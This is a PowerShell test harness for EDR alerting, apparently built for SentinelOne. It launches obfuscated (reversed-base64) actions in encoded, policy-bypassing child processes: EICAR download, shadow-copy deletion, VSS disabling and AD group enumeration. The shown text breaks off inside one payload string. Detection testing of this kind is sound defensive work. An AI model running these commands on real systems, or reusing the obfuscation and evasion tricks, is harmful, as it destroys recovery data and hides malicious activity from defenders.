<#
.SYNOPSIS
    EDR / SentinelOne alert-correlation test harness (SANDBOX USE ONLY).

.DESCRIPTION
    Presents a menu of detection-generating actions. Each action is launched in
    its OWN child process / window via Start-Process. That isolation is the whole
    point: when SentinelOne terminates (or quarantines) the child that performed
    the action, THIS menu process keeps running so you can fire the next test.

    Menu:
        1            Download EICAR and write it to disk
        2            Delete shadow copies      (shadow-copy deletion)
        3            Disable shadow copy / VSS
        enableshadow Re-enable shadow copy / VSS
        q            Quit

    Options 2, 3 and enableshadow require elevation, so those children are
    launched with -Verb RunAs (expect a UAC prompt per action).

    Intended for an authorized, non-production sandbox only.

.NOTES
    Version: 1.1.0
#>

# Harness version (bump when options or payloads change).
$ScriptVersion = '1.1.0'

# ----------------------------------------------------------------------------
# Working directory for artifacts + generated child scripts
# ----------------------------------------------------------------------------
$WorkDir = Join-Path $env:TEMP 'EDRTest'
if (-not (Test-Path $WorkDir)) {
    New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
}

# ----------------------------------------------------------------------------
# Restore-Payload: de-obfuscate an action payload just before it runs.
#   Stored form = reverse( base64( UTF8(command) ) ). Reverse the string, then
#   base64-decode, to reconstruct the original command text.
# ----------------------------------------------------------------------------
function Restore-Payload {
    param([Parameter(Mandatory)] [string] $Obf)
    $chars = $Obf.ToCharArray()
    [System.Array]::Reverse($chars)
    $b64 = -join $chars
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
}

# ----------------------------------------------------------------------------
# Session logging: every menu selection and the exact commands it runs are
# written to a timestamped log under .\Logs\ next to this script.
# ----------------------------------------------------------------------------
$LogDir = Join-Path $PSScriptRoot 'Logs'
if (-not (Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force | Out-Null }
$LogFile = Join-Path $LogDir ("EDR-Test-Menu-{0}.log" -f (Get-Date -Format 'yyyyMMdd-HHmmss'))

@"
================================================================================
  EDR Lab Rat - session log (v$ScriptVersion)
  Started : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
  Host    : $env:COMPUTERNAME
  User    : $env:USERDOMAIN\$env:USERNAME
================================================================================
"@ | Out-File -FilePath $LogFile -Encoding UTF8 -Force

function Write-RunLog {
    param([string] $Message, [string] $Level = 'INFO')
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path $LogFile -Value ("[{0}] [{1}] {2}" -f $ts, $Level.PadRight(5), $Message) -Encoding UTF8
}

function Write-RunLogBlock {
    param([string] $Text)
    Add-Content -Path $LogFile -Value $Text -Encoding UTF8
}

# Print the exact commands an option will run (to console) and record them (to log).
function Show-AndLogCommands {
    param(
        [Parameter(Mandatory)] [string] $Name,
        [Parameter(Mandatory)] [string] $CommandText,
        [bool] $Elevated = $false
    )
    Write-Host ""
    Write-Host "  Commands that will run for '$Name':" -ForegroundColor Cyan
    ($CommandText -split "`r?`n") | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
    Write-RunLog "OPTION '$Name' selected (elevated=$Elevated)" 'RUN'
    Write-RunLog '----- commands begin -----' 'CMD'
    Write-RunLogBlock $CommandText
    Write-RunLog '----- commands end -----' 'CMD'
}

# ----------------------------------------------------------------------------
# Helper: launch a scriptblock in a brand-new PowerShell process/window.
#   The decoded action body is delivered to the child in-memory via
#   -EncodedCommand (base64 UTF-16LE) - no plaintext .ps1 is written to disk.
#   The child still decodes + runs it, so AMSI scans the real script block at
#   execution time. If S1 kills that child, this parent menu survives untouched.
# ----------------------------------------------------------------------------
function Start-DetachedAction {
    param(
        [Parameter(Mandatory)] [string] $Name,   # label used for status/logging output
        [Parameter(Mandatory)] [string] $Body,   # obfuscated payload (decoded here)
        [switch] $Elevated                        # launch with UAC (RunAs)
    )

    $Body = Restore-Payload $Body

    # Show + log the exact commands this action will run in its child process.
    Show-AndLogCommands -Name $Name -CommandText $Body -Elevated:([bool]$Elevated)

    # Capture ALL of the child's output (the run results) to a per-run transcript
    # under .\Logs, in addition to showing it live in the child window.
    $runLog = Join-Path $LogDir ("run-{0}-{1}.log" -f $Name, (Get-Date -Format 'yyyyMMdd-HHmmss'))
    $header = "Start-Transcript -Path '$runLog' -Force *> `$null`r`n"

    # A short note in the child window. The window is kept open with -NoExit
    # (below) so you can read the output and watch any S1 reaction; close it
    # manually when you're done. Stop-Transcript closes the results capture.
    $footer = @'

Write-Host ""
Write-Host "[child] Action finished. This window stays open - close it when you're done." -ForegroundColor DarkGray
Stop-Transcript *> $null
'@

    Write-Host "    Results will be captured to: $runLog" -ForegroundColor DarkGray
    Write-RunLog "Results transcript: $runLog" 'INFO'

    # Encode the wrapped payload as base64 UTF-16LE for -EncodedCommand so the
    # plaintext never touches disk. (Watch the ~32k command-line length limit;
    # these payloads are only a few KB, well within it.)
    $encoded = [System.Convert]::ToBase64String(
        [System.Text.Encoding]::Unicode.GetBytes($header + $Body + $footer))

    $spArgs = @{
        FilePath     = 'powershell.exe'
        ArgumentList = @('-NoProfile', '-NoExit', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encoded)
        WindowStyle  = 'Normal'
    }
    if ($Elevated) { $spArgs['Verb'] = 'RunAs' }

    try {
        Start-Process @spArgs | Out-Null
        Write-Host "[+] Launched '$Name' in a separate process (in-memory payload)." -ForegroundColor Green
        Write-Host "    Delivered via -EncodedCommand; no plaintext written to disk." -ForegroundColor DarkGray
    }
    catch {
        Write-Host "[!] Failed to launch '$Name': $($_.Exception.Message)" -ForegroundColor Red
        Write-RunLog "OPTION '$Name' launch error: $($_.Exception.Message)" 'FAIL'
    }
}

# ----------------------------------------------------------------------------
# Helper: launch one of the bundled test scripts (in this script's folder) in
#   its own window. These are the existing S1 IDR / ISPM test scripts. We only
#   reference them by path (they carry their own logging); nothing is decoded.
# ----------------------------------------------------------------------------
function Start-DetachedScript {
    param(
        [Parameter(Mandatory)] [string] $Name,
        [Parameter(Mandatory)] [string] $ScriptPath,   # relative to this script's folder
        [switch] $Elevated
    )

    $full = Join-Path $PSScriptRoot $ScriptPath
    if (-not (Test-Path $full)) {
        Write-Host "[!] Not found: $full" -ForegroundColor Red
        Write-RunLog "OPTION '$Name' - script not found: $full" 'FAIL'
        return
    }

    $runLog = Join-Path $LogDir ("run-{0}-{1}.log" -f $Name, (Get-Date -Format 'yyyyMMdd-HHmmss'))
    $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$full`""
    Show-AndLogCommands -Name $Name -CommandText $cmd -Elevated:([bool]$Elevated)
    Write-Host "    Results will be captured to: $runLog" -ForegroundColor DarkGray
    Write-RunLog "Results transcript: $runLog" 'INFO'

    # Run the script inside a transcript so its full output (results) is captured.
    $inner = "Start-Transcript -Path '$runLog' -Force *> `$null; & '$full'; Stop-Transcript *> `$null"
    $spArgs = @{
        FilePath     = 'powershell.exe'
        ArgumentList = @('-NoProfile', '-NoExit', '-ExecutionPolicy', 'Bypass', '-Command', $inner)
        WindowStyle  = 'Normal'
    }
    if ($Elevated) { $spArgs['Verb'] = 'RunAs' }

    try {
        Start-Process @spArgs | Out-Null
        Write-Host "[+] Launched '$Name' ($ScriptPath) in a separate process." -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Failed to launch '$Name': $($_.Exception.Message)" -ForegroundColor Red
        Write-RunLog "OPTION '$Name' launch error: $($_.Exception.Message)" 'FAIL'
    }
}

# ----------------------------------------------------------------------------
# Cleanup: undo persistence + remove artifacts. Runs INLINE in the parent
#   (it is housekeeping, not a detection test, so no S1-kill isolation needed).
# ----------------------------------------------------------------------------
$CleanupBody = '==gCuFWeDBicvx2bDRmb19mcnVmcvZULgIiL0FGa0BicvZGInc3bkFGazVGbiFmbldCIlNXdg0CIlJXZoBCZlRnclZXZyBCVP5EIlJXYg0Fc15WYlx2YbJCI0N3bI1SZ0lmcXBCIgAiCuFWeDBicvx2bDRmb19mcnVmcvZULgISKzVWaw92Ygc3bkFGazBCZlxmYhNXak9CZlRXZsVGZoAyMvIDIz52bpRHcvBiOlR3bOBiLl52bEBSXwVnbhVGbjtlIgQ3cvhULlRXaydFIgACIKoQfgACIgoQehJ3RrJXYEBicvx2bDRmb19mcnVmcvZULgIiLylGRrJ3bXRCIulGIk5WdvZGIzVGbpZGI0NWYmlGdyFGIv5EIdBXduFWZsN2WiACdz9GStUGdpJ3VgACIgACIgAiC7BSKwAScl1CIkVmdv1WZyRCKgYWagACIgoQfgACIgoQfgACIgACIgAiC9BCIgACIgACIgACIgoAZlJFIy9GbvNEZuV3bydWZy9mRtAiIpU2ZhN3cl1kLu9Wa0BXZjhXRu8FJoQCI6kSZtFmTu8FJoQCIlRXZsVGZgQ3buBCZsV3bDBSXwVnbhVGbjtlIgQ3cvhULlRXaydFIgACIgACIgACIgACIgACIKsHIoNGdhNGI9BCIgACIgACIgACIgowKrQWZ29WblJHJgACIgACIgACIgACIgACIgogblVmcHBicvx2bDRmb19mcnVmcvZULgISKl1WYO5yXkgCJgQWZ0VGblREIdBXduFWZsN2WiACdz9GStUGdpJ3VgACIgACIgACIgACIgACIgoAcvR3Ug42bpR3YBJ3byJXRtASZjJ3bG1CIl1WYOxGb1ZkLfRCIoRXYQxWYyVGdpxULg0WZ0lULlZ3btVmUgACIgACIgACIgACIgACIgowegknc0BCIgACIgACIgACIgowegQ3YlpmYP1CajFWRy9mRgwHIlVnbpRnbvNUesRnblxWaTBibvlGdjFkcvJncF1CIlxWaG1CI0FGckAiclRHbpZULgIXaEtmcvdFJggGdhBVLg0WZ0lEZslGaD1CdldEIgACIgACIgowegkycuJXZ0RXYwRCIulGI0FGckgCIoNWYlJ3bmBCIgAiCwASPgQWZ29WblJHJgACIgoQKnEzcw5iKnACLnAXbk5iKfN3chNHbnACLn02bj5iKfJXYjlWZngCQg0DIz5mclRHdhBHJgACIgogLzRHcpJ3YzBCZslGajBCZlRXYyVmbldGIk5WYgwycw1WdkByUTF0UMBCLzRWYvxmb39GZgIVQDlURgozclxWamBCdjFmZpRncBByIgACIgogC9BCIgAiC5FmcHtmchREIy9GbvNEZuV3bydWZy9mRtAiIuQnblNXZyBHI09mbgcyazFGV0NXZUJFRFdCIrNXY0BCZlxWdkVGajNFIdBXduFWZsN2WiACdz9GStUGdpJ3VgACIgACIgAiC7BSZzxWZg0HIgACIK4WZlJ3RgI3bs92Qk5WdvJ3ZlJ3bG1CIi4yJrNXYUR3clRlUEV0Jgs2chRHIkVGb1RWZoN2cgQWZ0VGblREIdBXduFWZsN2WiACdz9GStUGdpJ3VgACIgACIgAiC7BSKwAScl1CIFR0TDRVSYVEVTFETkgCImlGIgACIKwGb15GJ+IDIG9CIis2chRFdzVGVSRURiAiTU9CIlRXZsVGRvASZ4VmLzt2chRHajNHIgACIK4SK4AibvlGdw9GIt9mcmhCIrNXY0BCZlxWdkVGajNFIjACIgAiCK0HIgACIKQWZSBicvx2bDRmb19mcnVmcvZULgISKldWYzNXZN5ibvlGdwV2Y4VkLfRCKkAiOlVHbhZHIuVnUg0Fc15WYlx2YbJCI0N3bI1SZ0lmcXBCIgACIgACIKsHIoNGdhNGI9BCIgAiC9BCIgACIgACIKkXYyd0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi4CduV2clJHcgQ3buByJl1WYOxWY2RyJgUWdsFmdg4WdSBSXwVnbhVGbjtlIgQ3cvhULlRXaydFIgACIgACIgACIgAiC7BSZzxWZg0HIgACIgACIgogblVmcHBicvx2bDRmb19mcnVmcvZULgIiLnUWbh5EbhZHJnASZ1xWY2Bib1JFIkVmdv1WZSBSXwVnbhVGbjtlIgQ3cvhULlRXaydFIgACIgACIgACIgAiCw9GdTBibvlGdjFkcvJncF1CIl1WYOxWY2RCIl1WYO1CI5V2SuVnckACa0FGUtASe0JXZw9mcQ1WZ0lULlZ3btVmUgACIgACIgACIgACIKsHIpUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgUWbh5EbhZHJgUWbh5ULgkXZL5WdyRCIoRXYQ1CI5RnclB3byBVblRXStQXZHhCImlGIgACIgACIgowegknc0BCIgAiCiQ3cpNnclBFdzVGVSRURiASPgUWbh5EbhZHJgACIgogIuVnUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVmchdHdm92UcpTVDtESiASPgASeltkb1JHJgACIgogLpgDIu9Wa0B3bg02byZGKgUWdsFmdgkXZrBib1JFIVN0SIByIgACIgogCuFWeDBicvx2bDRmb19mcnVmcvZULgIiLu4yc0NWYmlGdyFGI0NXZ0ByKgU2YuVGdzl2cyVGcgcmbpZ3btVmUg0Fc15WYlx2YbJCI0N3bI1SZ0lmcXBCIgAiC'
function Invoke-Cleanup {
    $cmd = Restore-Payload $CleanupBody
    Show-AndLogCommands -Name 'cleanup' -CommandText $cmd
    # cleanup runs inline (not a separate process), so capture its results
    # straight into the session log rather than a per-run transcript.
    $result = Invoke-Expression $cmd *>&1 | Out-String
    Write-Host $result
    Write-RunLog 'cleanup results:' 'RESULT'
    Write-RunLogBlock $result
}

# ----------------------------------------------------------------------------
# Action bodies (run inside the isolated child processes)
# ----------------------------------------------------------------------------

# 1) Download EICAR and write to disk.
#    Tries the official source first; falls back to assembling the standard
#    EICAR string locally (built from fragments so THIS harness file itself
#    doesn't contain the trigger string and get quarantined).
$EicarBody = '=0nCuVWZydEIy9GbvNEZuV3bydWZy9mRtASKoR3ZuVGTukSZslmR0V3bkASblRXStQXZHhCIm1CIi4yclRXeiBSfwsHIss2cpRGIu9GIlxWaGBSXkxWaoN2WigCI0N3bI1SZ0lmcXBCIgAiC7BSKlxWaGRXdvRCIoRXYQ1CdzVGVoAiZppQfK4WZlJ3RgI3bs92Qk5WdvJ3ZlJ3bG1CIiUGbpZEd19GJgozb0BiUBNUSFBSZ09mcXBSXkxWaoN2WiACdz9GStUGdpJ3VgACIgoQSJN0UBByZulGZvNmbF1CIl5WasdXZO9mTtAicllXYsRCIlVHbhZVLgUGbpZEd19GJggGdhBVLgQnblRnbvNUL0V2UgACIgoQfgACIgoQKpIXZ5FGbkgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIyVWehxGJgACIgACIgAiC7BSKrsSakAyOzACds1CIpRCI7ADI9ASakgCIy9mZgACIgogI90TUQd3bulVR1UkYqVTbWJnTxI2VaxWVWJ0MhhlWGVmVaFDVhh3VWdlWFZFbax2Vz5UMW9kRqZleaFTYXJEbXZlWWR1V0JTVYp1aWNlRUZ1VWxmVxMXbW5UNFJ2UkhlUz5UMWdFdyUVMFFjUXh3aVJnUxQGMVBTW3tmVWdlWuJ1RaFDVzpFMZhkWW1kWOZ0Y6lFbVFmVsV1UoNjVSRmRiZkVxY1UCpmViASPgIXZ5FGbkACIgAiCucmbpRXaydHIlJ3bmVmYgMXZtlGdgMDIlR2bjVGRg4yczVmbyFGagMXaoRHIulGIzJXYlBHchBiclZXZuBSZyVHdh52ZpNHIjACIgAiC0hXZ05WahxGcgUGa0BybzBCZlR2bj5WZtQjNlNXYi1SZsBXayRHIkVmcvR3cgMXagcmbpJHdzBCdzVGdgIVQDlURgUGaUByIgACIgowdvxGbllFIy9GbvNEZuV3bydWZy9mRtAiIu4iL5xGbhN2bsBiUBNUSFByZulGZslWdCBiLpkSZnF2czVWTu42bpRHclNGeF5yXkgCJoACZlxWahZGIkF2bs52dvREIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BCajRXYjpQfK4WZlJ3RgI3bs92Qk5WdvJ3ZlJ3bG1CIiUGbpZEd19GJgozb0BiUBNUSFBCZlRWYvxmb39GRg0FZslGajtlIgQ3cvhULlRXaydFIgACIKAjMgMWZTRXdvVWbpRVLgcmbpNnchB1YpNXYCV2cV1CIlxWaGRXdvRCIlxWaGRXdP1CIi02bj5ichNWal9yZy9mLyF2YpVmLlJXdjV2cv8iOzBHd0hmIgkmcV1CI0NXZ1FXZSJWZX1SZr9mdulEIgACIKsHI5JHdK4WY5NEIy9GbvNEZuV3bydWZy9mRtAiIu4iLkF2bs52dvRGISF0QJVEIn5Wa0BXblRHdBBSXkxWaoN2WiACdz9GStUGdpJ3VKkSKiM3ct1GSI9FZk1UT5lXe5JCI0FWby9mRtASZ0FGRtQXZHhCIm1CIi02bj5Sfws3XyF2YpVGX0NXZUJFRFJCKgAVTFRlO25WZkACa0FGUt4WavpEI9ASZslmR0V3bkogIw9GdTJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 2) Delete shadow copies (classic ransomware IOC).
$DeleteShadowBody = '=0nC5FmcHtmchREIy9GbvNEZuV3bydWZy9mRtAiIu0USDBSeiBCZlRncvBXZyBycllGcvNGI39GZhh2cg8mTg0FZslGajtlIgQ3cvhULlRXaydFIgACIKsHIlNHblBSfK0HIgACIK0HIkVmUgI3bs92Qk5WdvJ3ZlJ3bG1CIikSZnF2czVWTu42bpRHclNGeF5yXkgCJgoTKElkLzRCKkASZ29WblJHI09mbgQGb192Qg0FZslGajtlIgQ3cvhULlRXaydFI7BCajRXYjBCIgACIgACIK0HIikCRJ5yckgCJgQWZ29WblJFIdRGbph2YbJCI0N3bI1SZ0lmcXByOzRCI0NWZqJ2T0VHculULgU2YuFGdz5WStl2QtUmdv1WZSByegknc0BCIgACIgACIKsHIpM3dvRWYoNHJg4WagMHJoACajFWZy9mZgACIgogbhl3QgI3bs92Qk5WdvJ3ZlJ3bG1CIi4iLu0USDBSYpZHIzVWaw92Ygc3bkFGazByZulmbpFWblJHIn5Wa29WblJFIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BSKzd3bkFGazRCKgYWaKUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgkHcvN0dvRWYoN1XyMjbpdFIl1WYON3chx2QtASZj5WY0NnbJ1WaD1CdldEI9Ayc39GZhh2ckogLulWYtVmcgknbhBiZpBSTJN0LJ10VgEWa2BSeyRXZtVGblRHIsFmbvlGdpRGZhByLgs2YhJGbsFmRgMiCKc3bsxWZZBicvx2bDRmb19mcnVmcvZULgISRE90QUlEWFR1UBxEJgoTZk92YgQXa4VGIulWbkF2czZHIdRGbph2YbJCI0N3bI1SZ0lmcXpAdllWdx9CIsxWYvAyc39GZhh2cgUGdlxWZkBSZ4VmLulWbkF2czZnCuFWeDBicvx2bDRmb19mcnVmcvZULgIiLu4ibp1GZhN3c2BSYpZHIzVWaw92Ygc3bkFGazByZulGdlxWZEBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 3) Disable shadow copy / VSS.
$DisableShadowBody = '==wdvxGbllFIy9GbvNEZuV3bydWZy9mRtAiIFR0TDRVSYVEVTFETkAiOlR2bjBCdphXZgUmepNXZyBibp1GZhN3c2BSXkxWaoN2WiACdz9GStUGdpJ3VKIUTwIzM9UmepNHeh12LgozQ942bvAiOD1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmcgUGel5ibp1GZhN3c2pgLpUWdxlmboNWZ0ByJlxmYhNXakdCIu9Wbt92YgIXZoR3buFGKg0Wdtlmbp1GIlhGdg8GdgU2ZhJ3b0NHI39GZhh2cgsmbpJHaTByIKoQfKQWZSBicvx2bDRmb19mcnVmcvZULgISKldWYzNXZN5ibvlGdwV2Y4VkLfRCKkAiOlJ3b0NXZSJXZ0VHct92QtUGbiF2cpREIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BCajRXYjBSfKc3bsxWZZBicvx2bDRmb19mcnVmcvZULgICX6MEIy9mZgQWZsJWYzlGZgUmcvR3clJHItVGdzl3Ug0FZslGajtlIgQ3cvhULlRXaydFIgACIKA3b0NFIu9Wa0NWQy9mcyVULgICX6MkIgUmdpJHRtASZy9GdzVmUyVGd1BXbvNULlxmYhNXaEBCIgAiC7BSeyRnCuozQgI3bmBSZy9GdzVmcg8CIu9Wa0NWZ09mcQBSblR3c5NFImZ2bg4mc1RFIjogC39GbsVWWgI3bs92Qk5WdvJ3ZlJ3bG1CIi4CZlxmYhNXaEByb0BCdlNHIk5WYgQWZwB3b0NHIlNWa2JXZzByUTZFIdRGbph2YbJCI0N3bI1SZ0lmcXpQZ15Wa052bDlHb05WZsl2Ug42bpR3YBJ3byJXRtACZlxmYhNXaEBSZwlHVwVHdyFGdT1CITNlVgUWbh5ULgU2YpZnclNVL0V2UKUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgU2Yy9mRtAyUTZFIl1WYO1CIlNWa2JXZT1CcvR3UK4SZjlmdyV2cgkHcvNEI39GZhh2UgUWb1x2bWBSZoRHIlxmYhNXakBCZuFGIw9GdTByIKogbhl3QgI3bs92Qk5WdvJ3ZlJ3bG1CIi4iLuM1UWByLgkHcvNGI39GZhh2cgcmbpxmYhNXaEBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# enableshadow) Re-enable shadow copy / VSS (cleanup / restore state).
$EnableShadowBody = '9pwdvxGbll1ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIikSZnF2czVWTu42bpRHclNGeF5yXkgCJgojclRXdw12bD1Cdul2bwt2Ylh2Qg0FZslGajtlIgQ3cvhULlRXaydFIgACIKsHIoNGdhNGI9pgblVmcHBicvx2bDRmb19mcnVmcvZULgIiL05WavBHIlJ3b0NXZyBSYgQWZ0FWZyNEIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiCw9GdTBibvlGdjFkcvJncF1CIiM1ROlEVUV0UfllRJR0TNJCIlBXeURnbp9GUlJ3b0NXZS1CIiUGbiFmbFVmUtQ3clRlUEVkIg42bpRHcpJ3YzVGRtAiclRXdw12bD1Cdul2bwt2Ylh2QgACIgowegknc0pgLulWYnFGIzR3cphXZgkHcvNGI39GZhh2cgEGIvNHI05WavBHIlJ3b0NXZyBCazVmcmBSYgUGdhVmcjBSesxWYu9Wa0B3TgMiCK4WZlJ3RgI3bs92Qk5WdvJ3ZlJ3bG1CIiUERPNEVJhVRUNVQMRCI6UGZvNGI0lGelBSZ6l2clJHIulWbkF2czZHIdRGbph2YbJCI0N3bI1SZ0lmcXpgQHBTM9UmepNHeh12LgozQ942bvAiOD1jcvZ2LgU2ZhJ3b0N3dvRWYoNHIlpXazVmcgUGel5ibp1GZhN3c2pgC9pAZlJFIy9GbvNEZuV3bydWZy9mRtAiIpU2ZhN3cl1kLu9Wa0BXZjhXRu8FJoQCI6UmcvR3clJlclRXdw12bD1SZsJWYuVEIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BCajRXYjBSfK4WZlJ3RgI3bs92Qk5WdvJ3ZlJ3bG1CIiwlODBicvZGIkVGbiFmblBSZy9GdzVmcg0WZ0NXeTBSXkxWaoN2WiACdz9GStUGdpJ3VgACIgoAcvR3Ug42bpR3YBJ3byJXRtAiIcpzQiASZ2lmcE1CIlJ3b0NXZSJXZ0VHct92QtUGbiFmbFBCIgAiC7BSeyRnCu02bvJHIldWYy9GdzBydvRWYoNHIlZXanBCZuFGI6MEIy9mZg42bpR3YlR3byBFItVGdzl3UgUGbiFmbl1SZSByIKogblVmcHBicvx2bDRmb19mcnVmcvZULgIiLkVGdyFGdzBCZuFGIsFWduFWTg8GdgQXZzBSZjlmdyV2cgM1UWBSXkxWaoN2WiACdz9GStUGdpJ3VKUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgM1UWBSZtFmTtASZjlmdyV2UtQnchR3UKUWdulGdu92Q5xGduVGbpNFIu9Wa0NWQy9mcyVULgwWY15WYNBSZwlHVwVHdyFGdT1CITNlVgUWbh5ULgU2YpZnclNVL0V2UK4CdpBCdyFGdzBCZuFGIpwWY15WYNhCI0xWdhZWZkByc0lGIvRHIlNWa2JXZzByUTZFIlhGdgUmcvR3clJFIjogCuFWeDBicvx2bDRmb19mcnVmcvZULgIiLu4yUTZFIvASew92Ygc3bkFGazByZulGbiFmbl1SZSBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 4) List shadow copy / VSS state (READ-ONLY status check).
#    Run before/after options 2, 3 and enableshadow to visually confirm effect.
$ListShadowBody = 'lpXaT9Gd1FULgUGbiFGVtQXYtJ3bGBCfgUGc5RFdyFGdTBCLzVHdhR3UgwSZtFmTgQ3YlpmYP1CdjVGblNFI8BSZ15Wa052bDlHb05WZsl2Ug42bpR3YBJ3byJXRtAyUTZFIlNWa2JXZT1CdldkCuFWeDtmchREIy9GbvNEZuV3bydWZy9mRtAiIt0SLgU2YpZnclNHITNlVg0SLt4GYiACdz9GStUGdpJ3VKoQfgkXYyd0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi4STJNEI5JGIkVGdy9GclJHIzVWaw92Ygc3bkFGazBybOBSXkxWaoN2WiACdz9GStUGdpJ3VgsHIgACIgU2csVmC9BSZ6l2UvRXdB1CIlxmYhRVL0FWby9mRgwHIl1WYOVWb1x2bWBCLlRXYExGbhR3culEIsQUSgQ3YlpmYP1CdjVGblNFI8ByYzRCI7BSKjNHJoAiZppQZ15Wa052bDlHb05WZsl2Ug42bpR3YBJ3byJXRtASew92Q39GZhh2UfJzMul2VgUWbh50czFGbD1CIlNmbhR3culUbpNUL0V2Rg0DIjNHJK4WY5N0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi0SLtASKNl0QoASew92Q39GZhh2UfJzMul2Vg0SLt4GYiACdz9GStUGdpJ3VKoQZnFmcvR3c39GZhh2cgQ3cpxGIlhXZu4WatRWYzNndK4WY5N0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi0SLtASZnFmcvR3c39GZhh2cgQ3cpxGIulWbkF2czZHIt0SLuBmIgQ3cvhULlRXaydlCKM3dvRWYoNHI0NXasBSZ4VmLulWbkF2czZnCuFWeDtmchREIy9GbvNEZuV3bydWZy9mRtAiIt0SLgM3dvRWYoNHI0NXasBibp1GZhN3c2BSLt0ibgJCI0N3bI1SZ0lmcXpgCuFWeDBicvx2bDRmb19mcnVmcvZULgISK5xmbv1CZhVmcoASZ0FGdzByUTZFIvASew92Ygc3bkFGaTBSXkxWaoN2WiACdz9GStUGdpJ3VKISZ15Wa052bDJCI9ASZj5WZyVmZlJHUu9Wa0NWQy9mcyVEJ'

# 5) AD / privileged-group enumeration (T1069.002 / T1087.002).
#    Works domain-joined; falls back gracefully to local groups in a workgroup.
$AdEnumBody = '9pwdvxGbll1ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi4SZsJWYslWY2Fmb1BCUBRETg8CIkVmbp9mat4Wah12bkBCdv5EIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BCajRXYjBSfKISK0hXZ052bDdmbp1WYORHb1FmZlRmL092byRCKkAiO0hXZ052bDdmbp1WYORHb1FmZlRGIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiCiU0UER3bvJ1LvoDUBRETi0VSTRUQbBSPgQ3bvJHJgACIgowegknc0pgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIpQVQTJFIv5GIsk0UEFEKgQHelRnbvNGIulWYt9GZg8CIQFERMBSLt0ibgJCI0N3bI1SZ0lmcXpgC9pwdvxGbll1ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIikSZnF2czVWTu42bpRHclNGeF5yXkgCJgoTZsJWYslWY2FGI09mbgUGb1R2btBSey9GdjVmcpRUZ2lGdjFEIdRGbph2YbJCI0N3bI1SZ0lmcXBCIgAiC7BCajRXYjBSfKUmepN1b0VXQtASZsJWYU1Cdh1mcvZEI8BSZtFmT05WdvN2YB1WYTBCLl1WYOBCdjVmai9UL0NWZsV2UgwHIiMnbp1GZBBibpFWbvRkIgkHdpRnblRWStAiclJWbl1Ec19mcHRUQtQXZHBCIgAiCw9GdTBibvlGdjFkcvJncF1CI5J3b0NWZylGRlZXa0NWQgUGb1R2bN1Cdy9GctlEIgACIKsHI5JHdK4WY5N0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi0SLtASK05WZzVmcwBCVBNlUgYWaoASZsVHZv1GI5J3b0NWZylGRlZXa0NWQg0SLt4GYiACdz9GStUGdpJ3VKowcwV3byd2LgkWbh9Ga3pgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIzBXdvJ3ZvASatF2bodHIt0SLuBmIgQ3cvhULlRXaydlCKMncvRXYyR3cp5WatRWQgAXdvJ3ZsF2YvxGI0VmbK4WY5N0ayFGRgI3bs92Qk5WdvJ3ZlJ3bG1CIi0SLtAycy9GdhJHdzlmbp1GZBBCc19mcnxWYj9GbgQXZuBSLt0ibgJCI0N3bI1SZ0lmcXpgCulWYt9GZvACc19mcnBCdl5mCuFWeDtmchREIy9GbvNEZuV3bydWZy9mRtAiIt0SLgkycwV3bydGIulWYt9GZgwGbhhCIulWYt9GZvACc19mcnBCdl5GIt0SLuBmIgQ3cvhULlRXaydlCK4Wah12bk9CIiMnbp1GZBBSZzlmcwJXZ05WRiACc19mcnBCdl5mCuFWeDtmchREIy9GbvNEZuV3bydWZy9mRtAiIt0SLg4Wah12bk9CInMnbp1GZBBSZzlmcwJXZ05WRnACc19mcnBCdl5GIt0SLuBmIgQ3cvhULlRXaydlCK4Wah12bk9CIiMnbp1GZBBibpFWbvRkIgAXdvJ3ZgQXZupgbhl3QrJXYEBicvx2bDRmb19mcnVmcvZULgISLt0CIulWYt9GZvAyJz5WatRWQg4Wah12bEdCIwV3bydGI0Vmbg0SLt4GYiACdz9GStUGdpJ3VKogbhl3QgI3bs92Qk5Wdv